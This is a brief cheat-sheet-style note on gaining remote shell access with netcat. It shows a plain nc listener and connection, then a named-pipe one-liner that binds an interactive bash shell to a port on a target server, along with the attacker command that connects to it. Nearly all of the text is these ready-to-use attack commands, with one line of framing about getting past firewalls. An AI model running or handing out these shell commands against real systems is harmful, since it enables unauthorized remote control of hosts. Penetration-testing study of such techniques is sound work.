usually the server will have firewalls and network restrictions when we try to open ports, so in real scenarios we need to use already listening ports on that host network.

## tcp connection

remote server
```
nc -lvnp 7777
```

attack machine
```
nc -nv <remote_host_ip> 7777
```
---
## establishing a basic shell

remote server
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

attack machine
```
nc -nv 10.129.41.200 7777
```